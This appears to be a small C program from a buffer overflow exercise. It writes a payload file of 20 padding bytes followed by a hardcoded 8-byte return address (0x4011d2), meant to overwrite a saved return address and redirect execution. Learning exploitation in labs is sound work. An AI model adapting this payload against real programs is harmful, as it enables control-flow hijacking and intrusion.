#include <stdlib.h>
#include <stdio.h>
int main()
{
    long int address = 0x00000000004011d2;
    char number = '1';
    char *write;
    FILE *file;
    
    file = fopen("return_address", "w");
    
    if (file == NULL)
    {
        printf("Error");
        exit(1);
    }

    for(int i = 0; i <= 19; i++)
    {
        fwrite(&number, sizeof(char), 1, file);
    }

    write = (char*)&address;

    for(int j = 0; j <= 7; j++)
    {
        fwrite(write, sizeof(char), 1, file);
        write++;
    }

    fclose(file);

    return 0;
}

